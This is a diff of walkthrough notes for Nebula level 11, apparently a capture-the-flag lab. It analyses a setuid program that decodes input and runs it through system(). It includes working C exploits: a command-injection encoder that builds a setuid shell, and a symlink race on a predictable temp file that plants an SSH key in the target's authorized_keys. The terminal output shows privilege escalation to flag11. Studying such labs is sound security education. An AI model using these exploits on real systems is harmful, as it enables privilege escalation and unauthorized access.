@@ -179,10 +179,12 @@ Code Analysis
   Then, atoi() extracts only xx part and store it into int length variable.
  : "Content-Length: 10" -> Ok
  : "Content-Length:10" -> Not OK. "Invalid header" error output
+
 - If length is less than buffer size (1024), continue with process(buf, length)
 - If length is greater than buffer size(1024)
   a. getrand(char **path) 
     - Create a random filename by using a environment variable TEMP, pid, and random 6 characters
+      : TEMP environment is not defined. So you need to define it like $export TEMP=/tmp
     - By using the random filename, create and open the file in RW mode with 600 permission, unlink the file(the file will exisit
       until the current process releases the file), and return file descriptor
   b. while(blue >0) { ... blue -= pink;}
@@ -190,4 +192,237 @@ Code Analysis
       length bytes
   c. mmap()
     - Create a private memory space of the calling process <= Used as dynamic buffer space
-    - Call process(mem, length);
+    - Call process(mem, length)
+- process(char *buffer, int length)
+  : Process funciton takes two parameters, buffer with provided content and length with sizeof(buffer)
+  : With a key using LSB 8-bit of int lenghth, exclusive, and key value change, managle the buffer content <= a kind of simple encryption
+  : Then finally call System(buffer)
+  
+Vulnerability and Attack scenario
+- Attack System(buffer) under process() by manipulating buffer contents.
+  : Provided an encoded command string with null termination.
+
+########## Code for flag11 shell #############
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+int main(){
+  setresuid(988, 988, 988);
+  system("/bin/sh");
+}
+##############################################
+
+######### Code for feeding encoded content and "Content-Length: 1024" ###########
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <strings.h>
+#include <string.h>
+
+void decode_process(char *buffer, int length)
+{
+  unsigned int key;
+  int i;
+
+  // Use lower 8 bits - Only allow ASC code (0 ~ 255)
+  key = length & 0xff;
+  // ^ - Bitwise exclusve OR operation to randomize buffer value
+  for(i = 0; i < length; i++) {
+      buffer[i] ^= key;
+      key -= (buffer[i]^key);   <== Reverse the key code of encoding
+  }
+}
+
+int main(){
+  char cmd[1024] = "gcc /tmp/f11sh.c -o /home/flag11/f11sh;chmod +s /home/flag11/f11sh\x00";
+  //char cmd[1024] = "getflag";
+
+  int length = sizeof(cmd);
+
+  int i=0;
+  decode_process(cmd, length);
+
+  i=strlen(cmd);
+  for(i;i<length;i++){
+    cmd[i] = 'A';
+  }
+  // puts add new-line at the end
+  puts("Content-Length: 1024");
+  fwrite(cmd, 1, 1024, stdout);
+
+}
+
+##########################################################################################
+level11@nebula:~$ ./exploit | /home/flag11/flag11
+blue = 1024, length = 1024, pink = 1024
+## It seems in some reason, the process is not running with the privilege of flag11 ##
+/usr/bin/ld: cannot open output file /home/flag11/f11sh: Permission denied
+collect2: ld returned 1 exit status
+chmod: cannot access `/home/flag11/f11sh': No such file or directory
+
+
+** From: https://www.ayrx.me/nebula-walkthrough#toc-11 **
+** It fails as the privlege level drops to level11 not flag11.
+level11@nebula:~$ ./exploit | strace /home/flag11/flag11
+....
+mmap2(NULL, 1024, PROT_READ|PROT_WRITE, MAP_PRIVATE, 3, 0) = 0xb7847000
+getgid32()                              = 1012
+setgid32(1012)                          = 0
+getuid32()                              = 1012
+setuid32(1012)                          = 0
+....
+exit_group(256)                         = ?
+
+
+- Privilege drop to level11 occurs after mmap() call. So this time we attack getrand() which generates a randome file and before
+the mmap() call. When the process creates a random file, we write level11 user's public ssh key into the randmo file and then create 
+a symbolic link to /home/flag11/.ssh/authorized_keys.
+
+## Generate SSH public for level11
+level11@nebula:~$ ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/level11/.ssh/id_rsa):
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in /home/level11/.ssh/id_rsa.
+Your public key has been saved in /home/level11/.ssh/id_rsa.pub.
+The key fingerprint is:
+b9:d9:2b:a7:2c:a5:e7:dd:8b:21:fa:94:56:4b:5a:d9 level11@nebula
+The key's randomart image is:
++--[ RSA 2048]----+
+|                 |
+|                 |
+|                 |
+|         . o     |
+|        S = E    |
+|        .X .     |
+|       oO +      |
+|      o=oo.=     |
+|      .==++ o.   |
++-----------------+
+level11@nebula:~$ ls -al .ssh/
+total 8
+drwx------ 2 level11 level11   80 2019-02-16 21:54 .
+drwxr-x--- 1 level11 level11  340 2019-02-16 21:53 ..
+-rw------- 1 level11 level11 1675 2019-02-16 21:54 id_rsa
+-rw-r--r-- 1 level11 level11  396 2019-02-16 21:54 id_rsa.pub
+
+level11@nebula:~$ more /home/level11/.ssh/id_rsa.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC12FUNdsUzMmH9prKYl646wzyiuEv9RMACIWeEagri4jE
+Irgd43+g1nfuQq5PhsXfwsIeZ7ShRf1oG0Zdf3WPdOfY4awhcfyU0hWoOn3nYzG+ZRFDCUMymF7OdZF/Ewo
+Qy4Z+o99YmG2iPbVAC9EBOwZrDni012rNGA8CXZ5BGL+Sag+kiSn1xYitf0K9K3aB5pWZEhDiiSKpHHbbf4
+fo2lA5WyPpennuJ8jFDVkwGtr3I4mVHWjttjtcSZaAOmaizc0XYxvhX0rs3PrwX1gFALnGu52VCfMZ5cwBV
+M/c+EuPzyDoC+EXk98JjJ4cqsL4qAgt6iGr3uh73dsQBHHhJ level11@nebula
+
+
+## Attack code ##
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <sys/mman.h>
+
+void getrand(char **path, int pid, int time)
+{
+    char *tmp;
+    int fd;
+
+    srandom(time);
+
+    tmp = getenv("TEMP");
+
+    asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid,
+        'A' + (random() % 26), '0' + (random() % 10),
+        'a' + (random() % 26), 'A' + (random() % 26),
+        '0' + (random() % 10), 'a' + (random() % 26));
+}
+
+int main(int argc, char **argv)
+{
+    char line[256];
+    char buf[2048] ="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC12FUNdsUzMmH9prKYl646wzyiuEv9RMACIWeEagri4jEIrgd43+g1nfuQq5PhsXfwsIeZ7ShRf1oG0Zdf3WPdOfY4awhcfyU0hWoOn3nYzG+ZRFDCUMymF7OdZF/EwoQy4Z+o99YmG2iPbVAC9EBOwZrDni012rNGA8CXZ5BGL+Sag+kiSn1xYitf0K9K3aB5pWZEhDiiSKpHHbbf4fo2lA5WyPpennuJ8jFDVkwGtr3I4mVHWjttjtcSZaAOmaizc0XYxvhX0rs3PrwX1gFALnGu52VCfMZ5cwBVM/c+EuPzyDoC+EXk98JjJ4cqsL4qAgt6iGr3uh73dsQBHHhJ level11@nebula";
+
+    int pid;
+    int fd;
+    char *path;
+    FILE* stream;
+
+    pid = getpid() + 1;
+    getrand(&path, pid, time(NULL));
+    symlink("/home/flag11/.ssh/authorized_keys", path);
+    fprintf(stdout, "Content-Length: 2048\n%s", buf);
+}
+
+level11@nebula:~$ gcc /home/level11/attkssh.c -o /home/level11/attkssh
+level11@nebula:~$ ./attkssh | /home/flag11/flag11
+blue = 2048, length = 2048, pink = 395
+blue = 1653, length = 2048, pink = 0
+flag11: fread fail(blue = 1653, length = 2048): Operation not permitted
+level11@nebula:~$ ls -al /tmp
+total 12
+drwxrwxrwt 6 root    root     180 2019-02-16 22:11 .
+drwxr-xr-x 1 root    root     220 2019-02-15 07:46 ..
+lrwxrwxrwx 1 level11 level11   33 2019-02-16 22:11 9390.Q3bO7i -> /home/flag11/.ssh/authorized_keys
+-rwsrwsr-x 1 level11 level11 7241 2019-02-16 21:48 f11sh
+-rw-rw-r-- 1 level11 level11  172 2019-02-16 21:47 f11sh.c
+drwxrwxrwt 2 root    root      40 2019-02-15 07:46 .ICE-unix
+drwxrwxrwt 2 root    root      40 2019-02-15 07:46 VMwareDnD
+drwx------ 2 root    root     100 2019-02-15 07:46 vmware-root
+drwxrwxrwt 2 root    root      40 2019-02-15 07:46 .X11-unix
+level11@nebula:~$ more /tmp/9390.Q3bO7i
+/tmp/9390.Q3bO7i: Permission denied
+
+level11@nebula:~$ ls -al /home/flag11/.ssh
+total 4
+drwxr-xr-x 1 flag11 flag11   60 2019-02-16 00:56 .
+drwxr-x--- 1 flag11 level11  60 2012-08-20 18:58 ..
+-rw------- 1 flag11 level11 396 2019-02-16 22:11 authorized_keys
+
+level11@nebula:~$ ssh -i /home/level11/.ssh/id_rsa flag11@127.0.0.1
+The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
+ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
+
+      _   __     __          __
+     / | / /__  / /_  __  __/ /___ _
+    /  |/ / _ \/ __ \/ / / / / __ `/
+   / /|  /  __/ /_/ / /_/ / / /_/ /
+  /_/ |_/\___/_.___/\__,_/_/\__,_/
+
+    exploit-exercises.com/nebula
+
+
+For level descriptions, please see the above URL.
+
+To log in, use the username of "levelXX" and password "levelXX", where
+XX is the level number.
+
+Currently there are 20 levels (00 - 19).
+
+
+Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+New release '12.04 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+flag11@nebula:~$ id
+uid=988(flag11) gid=988(flag11) groups=988(flag11)
+flag11@nebula:~$ getflag
+You have successfully executed getflag on a target account
+flag11@nebula:~$
+
+
+
